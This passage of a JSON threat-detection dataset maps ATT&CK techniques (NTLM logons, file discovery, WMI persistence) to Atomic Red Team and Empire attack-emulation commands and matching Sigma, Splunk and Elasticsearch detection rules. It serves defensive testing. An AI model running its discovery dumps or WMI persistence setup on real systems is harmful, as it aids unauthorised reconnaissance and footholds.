-(AccountName=\"ANONYMOUS LOGON\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*4624)(?=.*(?:.*(?:.*(?:.*(?=.*S-1-0-0)(?=.*3)(?=.*NtLmSsp)(?=.*0))|.*(?:.*(?=.*9)(?=.*seclogo)))))))(?=.*(?!.*(?:.*(?=.*ANONYMOUS LOGON)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: NTLM Logon\nid: 98c3bcf1-56f2-49dc-9d8d-c66cf190238b\nstatus: experimental\ndescription: Detects logons using NTLM, which could be caused by a legacy source or attackers\nreferences:\n    - https://twitter.com/JohnLaTwC/status/1004895028995477505\n    - https://goo.gl/PsqrhT\nauthor: Florian Roth\ndate: 2018/06/08\ntags:\n    - attack.lateral_movement\n    - attack.t1075\nlogsource:\n    product: windows\n    service: ntlm\n    definition: Reqiures events from Microsoft-Windows-NTLM/Operational\ndetection:\n    selection:\n        EventID: 8002\n        CallingProcessName: '*'  # We use this to avoid false positives with ID 8002 on other log sources if the logsource isn't set correctly\n    condition: selection\nfalsepositives:\n    - Legacy hosts\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: NTLM Logon\nid: 98c3bcf1-56f2-49dc-9d8d-c66cf190238b\nstatus: experimental\ndescription: Detects logons using NTLM, which could be caused by a legacy source or attackers\nreferences:\n    - https://twitter.com/JohnLaTwC/status/1004895028995477505\n    - https://goo.gl/PsqrhT\nauthor: Florian Roth\ndate: 2018/06/08\ntags:\n    - attack.lateral_movement\n    - attack.t1075\nlogsource:\n    product: windows\n    service: ntlm\n    definition: Reqiures events from Microsoft-Windows-NTLM/Operational\ndetection:\n    selection:\n        EventID: 8002\n        CallingProcessName: '*'  # We use this to avoid false positives with ID 8002 on other log sources if the logsource isn't set correctly\n    condition: selection\nfalsepositives:\n    - Legacy hosts\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"8002\" AND CallingProcessName.keyword:*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/NTLM-Logon <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"NTLM Logon\",\\n    \"description\": \"Detects logons using NTLM, which could be caused by a legacy source or attackers\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1075\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"8002\\\\\" AND CallingProcessName.keyword:*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"8002\\\\\" AND CallingProcessName.keyword:*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'NTLM Logon\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"8002\" AND CallingProcessName.keyword:*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"8002\" CallingProcessName=\"*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"8002\" CallingProcessName=\"*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*8002)(?=.*.*))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1083/T1083.yaml", "command": "dir /s c:\\ >> %temp%\\download\ndir /s \"c:\\Documents and Settings\" >> %temp%\\download\ndir /s \"c:\\Program Files\\\" >> %temp%\\download\ndir /s d:\\ >> %temp%\\download\ndir \"%systemdrive%\\Users\\*.*\" >> %temp%\\download\ndir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> %temp%\\download\ndir \"%userprofile%\\Desktop\\*.*\" >> %temp%\\download\ntree /F >> %temp%\\download\n", "name": null}, {"source": "atomics/T1083/T1083.yaml", "command": "ls -recurse\nget-childitem -recurse\ngci -recurse\n", "name": null}, {"source": "atomics/T1083/T1083.yaml", "command": "ls -a > allcontents.txt\nls -la /Library/Preferences/ > detailedprefsinfo.txt\nfile */* *>> ../files.txt\nfind . -type f\nls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'\nlocate *\nwhich sh\n", "name": null}, {"source": "atomics/T1083/T1083.yaml", "command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/loot.txt\ncat /etc/mtab > /tmp/loot.txt\nfind . -type f -iname *.pdf > /tmp/loot.txt\nfind . -type f -name \".*\"\n", "name": null}, {"source": "data/abilities/discovery/1c353eb4-29ab-4dfe-88ed-f34f5a60848e.yml", "command": {"windows": {"psh": {"command": "Get-ChildItem -Path #{host.system.path}\n"}}}, "name": "Find or discover files on the file system"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/file_finder", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/file_finder", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/find_interesting_file", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/find_interesting_file", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/get_indexed_item", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/get_indexed_item", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_fileserver", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_fileserver", "name": "Empire Module Command"}], "command_list": ["dir /s c:\\ >> %temp%\\download\ndir /s \"c:\\Documents and Settings\" >> %temp%\\download\ndir /s \"c:\\Program Files\\\" >> %temp%\\download\ndir /s d:\\ >> %temp%\\download\ndir \"%systemdrive%\\Users\\*.*\" >> %temp%\\download\ndir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> %temp%\\download\ndir \"%userprofile%\\Desktop\\*.*\" >> %temp%\\download\ntree /F >> %temp%\\download\n", "ls -recurse\nget-childitem -recurse\ngci -recurse\n", "ls -a > allcontents.txt\nls -la /Library/Preferences/ > detailedprefsinfo.txt\nfile */* *>> ../files.txt\nfind . -type f\nls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'\nlocate *\nwhich sh\n", "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/loot.txt\ncat /etc/mtab > /tmp/loot.txt\nfind . -type f -iname *.pdf > /tmp/loot.txt\nfind . -type f -name \".*\"\n", {"windows": {"psh": {"command": "Get-ChildItem -Path #{host.system.path}\n"}}}, "powershell/collection/file_finder", "powershell/collection/file_finder", "powershell/collection/find_interesting_file", "powershell/collection/find_interesting_file", "powershell/collection/get_indexed_item", "powershell/collection/get_indexed_item", "powershell/situational_awareness/network/powerview/get_fileserver", "powershell/situational_awareness/network/powerview/get_fileserver"], "technique_id": "T1083", "parsed_datasets": [{"Atomic Red Team Test - File and Directory Discovery": {"display_name": "File and Directory Discovery", "atomic_tests": [{"description": "Find or discover files on the file system\n", "supported_platforms": ["windows"], "name": "File and Directory Discovery", "executor": {"elevation_required": false, "command": "dir /s c:\\ >> %temp%\\download\ndir /s \"c:\\Documents and Settings\" >> %temp%\\download\ndir /s \"c:\\Program Files\\\" >> %temp%\\download\ndir /s d:\\ >> %temp%\\download\ndir \"%systemdrive%\\Users\\*.*\" >> %temp%\\download\ndir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> %temp%\\download\ndir \"%userprofile%\\Desktop\\*.*\" >> %temp%\\download\ntree /F >> %temp%\\download\n", "name": "command_prompt"}}, {"description": "Find or discover files on the file system\n", "supported_platforms": ["windows"], "name": "File and Directory Discovery", "executor": {"elevation_required": false, "command": "ls -recurse\nget-childitem -recurse\ngci -recurse\n", "name": "powershell"}}, {"description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n", "supported_platforms": ["macos", "linux"], "name": "Nix File and Diectory Discovery", "executor": {"command": "ls -a > allcontents.txt\nls -la /Library/Preferences/ > detailedprefsinfo.txt\nfile */* *>> ../files.txt\nfind . -type f\nls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'\nlocate *\nwhich sh\n", "name": "sh"}}, {"description": "Find or discover files on the file system\n", "supported_platforms": ["macos", "linux"], "name": "Nix File and Directory Discovery", "executor": {"command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/loot.txt\ncat /etc/mtab > /tmp/loot.txt\nfind . -type f -iname *.pdf > /tmp/loot.txt\nfind . -type f -name \".*\"\n", "name": "sh"}}], "attack_technique": "T1083"}}, {"Mitre Stockpile - Find or discover files on the file system": {"platforms": {"windows": {"psh": {"command": "Get-ChildItem -Path #{host.system.path}\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.system.path"}]}], "description": "Find or discover files on the file system", "tactic": "discovery", "technique": {"attack_id": "T1083", "name": "File and Directory Discovery"}, "id": "1c353eb4-29ab-4dfe-88ed-f34f5a60848e", "name": "File and Directory Discovery"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1083", "Empire Module": "powershell/collection/file_finder", "Technique": "File and Directory Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/file_finder\":  [\"T1083\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1083", "Empire Module": "powershell/collection/find_interesting_file", "Technique": "File and Directory Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/find_interesting_file\":  [\"T1083\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1083", "Empire Module": "powershell/collection/get_indexed_item", "Technique": "File and Directory Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/get_indexed_item\":  [\"T1083\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1083", "Empire Module": "powershell/situational_awareness/network/powerview/get_fileserver", "Technique": "File and Directory Discovery", "ATT&CK Technique #2": "T1135", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_fileserver\":  [\"T1083\",\"T1135\"],"}}], "queries": [{"query": "Yml\ntitle: In the windows files and directories found\ndescription: windows server 2016\ntags: T1083\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ windows \\ system32 \\ tree.com' # process information> Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: tree # Process information> process command line\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1084/T1084.yaml", "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter;\nConsumer = [Ref] $Consumer;\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/wmi_updater", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/wmi_updater", "name": "Empire Module Command"}], "command_list": ["$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter;\nConsumer = [Ref] $Consumer;\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n", "powershell/persistence/elevated/wmi_updater", "powershell/persistence/elevated/wmi_updater"], "technique_id": "T1084", "parsed_datasets": [{"Atomic Red Team Test - Windows Management Instrumentation Event Subscription": {"display_name": "Windows Management Instrumentation Event Subscription", "atomic_tests": [{"description": "Run from an administrator powershell window\n\nAfter running, reboot the victim machine. After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n", "supported_platforms": ["windows"], "name": "Persistence", "executor": {"elevation_required": true, "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter;\nConsumer = [Ref] $Consumer;\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n", "name": "powershell", "cleanup_command": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-Example'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-Example'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue\n\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n"}}], "attack_technique": "T1084"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1084", "Empire Module": "powershell/persistence/elevated/wmi_updater", "Technique": "Windows Management Instrumentation Event Subscription", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/elevated/wmi_updater\":  [\"T1084\"],"}}], "queries": [{"query": "title: WMI Event Subscription\nid: 0f06a3a5-6a09-413f-8743-e6cf35561297\nstatus: experimental\ndescription: Detects creation of WMI event subscription persistence method\nreferences:\n    - https://attack.mitre.org/techniques/T1084/\ntags:\n    - attack.t1084\n    - attack.persistence\nauthor: Tom Ueltschi (@c_APT_ure)\ndate: 2019/01/12\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selector:\n        EventID:\n            - 19\n            - 20\n            - 21\n    condition: selector\nfalsepositives:\n    - exclude legitimate (vetted) use of WMI event subscription in your network\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: WMI Event Subscription\nid: 0f06a3a5-6a09-413f-8743-e6cf35561297\nstatus: experimental\ndescription: Detects creation of WMI event subscription persistence method\nreferences:\n    - https://attack.mitre.org/techniques/T1084/\ntags:\n    - attack.t1084\n    - attack.persistence\nauthor: Tom Ueltschi (@c_APT_ure)\ndate: 2019/01/12\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selector:\n        EventID:\n            - 19\n            - 20\n            - 21\n    condition: selector\nfalsepositives:\n    - exclude legitimate (vetted) use of WMI event subscription in your network\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "EventID:(\"19\" OR \"20\" OR \"21\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/WMI-Event-Subscription <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"WMI Event Subscription\",\\n    \"description\": \"Detects creation of WMI event subscription persistence method\",\\n    \"tags\": [\\n      \"attack.t1084\",\\n      \"attack.persistence\"\\n    ],\\n    \"query\": \"EventID:(\\\\\"19\\\\\" OR \\\\\"20\\\\\" OR \\\\\"21\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"EventID:(\\\\\"19\\\\\" OR \\\\\"20\\\\\" OR \\\\\"21\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'WMI Event Subscription\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "EventID:(\"19\" \"20\" \"21\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"19\" OR EventID=\"20\" OR EventID=\"21\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "event_id IN [\"19\", \"20\", \"21\"]", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*19|.*20|.*21)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: WMI Persistence - Command Line Event Consumer\nid: 05936ce2-ee05-4dae-9d03-9a391cf2d2c6\nstatus: experimental\ndescription: Detects WMI command line event consumers\nreferences:\n    - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/\nauthor: Thomas Patzke\ndate: 2018/03/07\ntags:\n    - attack.t1084\n    - attack.persistence\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 7\n        Image: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe'\n        ImageLoaded: 'wbemcons.dll'\n    condition: selection\nfalsepositives: \n    - Unknown (data set is too small; further testing needed)\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: WMI Persistence - Command Line Event Consumer\nid: 05936ce2-ee05-4dae-9d03-9a391cf2d2c6\nstatus: experimental\ndescription: Detects WMI command line event consumers\nreferences:\n    - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/\nauthor: Thomas Patzke\ndate: 2018/03/07\ntags:\n    - attack.t1084\n    - attack.persistence\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 7\n        Image: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe'\n        ImageLoaded: 'wbemcons.dll'\n    condition: selection\nfalsepositives: \n    - Unknown (data set is too small; further testing needed)\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"7\" AND Image:\"C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\wbem\\\\\\\\WmiPrvSE.exe\" AND ImageLoaded:\"wbemcons.dll\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/WMI-Persistence---Command-Line-Event-Consumer <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"WMI Persistence - Command Line Event Consumer\",\\n    \"description\": \"Detects WMI command line event consumers\",\\n    \"tags\": [\\n      \"attack.t1084\",\\n      \"attack.persistence\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"7\\\\\" AND Image:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\wbem\\\\\\\\\\\\\\\\WmiPrvSE.exe\\\\\" AND ImageLoaded:\\\\\"wbemcons.dll\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"7\\\\\" AND Image:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\wbem\\\\\\\\\\\\\\\\WmiPrvSE.exe\\\\\" AND ImageLoaded:\\\\\"wbemcons.dll\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'WMI Persistence - Command Line Event Consumer\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"7\" AND Image:\"C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\wbem\\\\\\\\WmiPrvSE.exe\" AND ImageLoaded:\"wbemcons.dll\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"7\" Image=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\wbem\\\\\\\\WmiPrvSE.exe\" ImageLoaded=\"wbemcons.dll\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"7\" Image=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\wbem\\\\\\\\WmiPrvSE.exe\" ImageLoaded=\"wbemcons.dll\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*7)(?=.*C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE\\\\.exe)(?=.*wbemcons\\\\.dll))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: WMI Persistence - Script Event Consumer File Write\nid: 33f41cdd-35ac-4ba8-814b-c6a4244a1ad4\nstatus: experimental\ndescription: Detects file writes of WMI script event consumer\nreferences:\n    - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/\nauthor: Thomas Patzke\ndate: 2018/03/07\ntags:\n    - attack.t1084\n    - attack.persistence\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 11\n        Image: 'C:\\WINDOWS\\system32\\wbem\\scrcons.exe'\n    condition: selection\nfalsepositives: \n    - Unknown (data set is too small; further testing needed)\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: WMI Persistence - Script Event Consumer File Write\nid: 33f41cdd-35ac-4ba8-814b-c6a4244a1ad4\nstatus: experimental\ndescription: Detects file writes of WMI script event consumer\nreferences:\n    - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/\nauthor: Thomas Patzke\ndate: 2018/03/07\ntags:\n    - attack.t1084\n    - attack.persistence\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 11\n        Image: 'C:\\WINDOWS\\system32\\wbem\\scrcons.exe'\n    condition: selection\nfalsepositives: \n    - Unknown (data set is too small; further testing needed)\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"11\" AND Image:\"C\\\\:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\wbem\\\\\\\\scrcons.exe\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/WMI-Persistence---Script-Event-Consumer-File-Write <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"WMI Persistence - Script Event Consumer File Write\",\\n    \"description\": \"Detects file writes of WMI script event consumer\",\\n    \"tags\": [\\n      \"attack.t1084\",\\n      \"attack.persistence\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"11\\\\\" AND Image:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\WINDOWS\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\wbem\\\\\\\\\\\\\\\\scrcons.exe\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": 